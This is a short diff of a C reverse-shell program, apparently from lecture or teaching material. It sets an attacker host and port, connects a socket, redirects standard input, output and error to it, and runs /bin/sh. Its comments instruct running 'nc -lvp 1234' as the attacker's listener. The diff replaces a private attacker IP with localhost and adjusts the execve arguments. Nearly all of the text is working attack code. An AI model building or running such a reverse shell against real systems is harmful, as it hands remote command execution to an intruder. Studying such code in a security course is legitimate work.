@@ -5,13 +5,20 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 
-// Attacker's IP address and port
-#define HOST "10.27.51.175"
+/*
+ *  Attacker's IP address and port. This IP 
+ *  address was in use at the lecture. If 
+ *  you want to use this example, change HOST
+ *  IP address accordingly.
+ */
+#define HOST "127.0.0.1"
 #define PORT 1234
+/*
+ * For the server, run "nc -lvp 1234" in attacker's
+ * terminal
+ */
 
-// For the server, run "nc -lvp 1234" in attacker's
-// terminal
-int main()
+int main(int argc, char* argv[], char* envp[])
 {
     struct sockaddr_in sa = {
         .sin_family = AF_INET,
@@ -27,7 +34,9 @@ int main()
     dup2(s, 1); // stdout
     dup2(s, 2); // stderr
 
-    execve("/bin/sh", NULL, NULL);
+    char* argv_[] = {};
+    char* envp_[] = {};
+    execve("/bin/sh", argv_, envp_);
 
     return 0;
 }
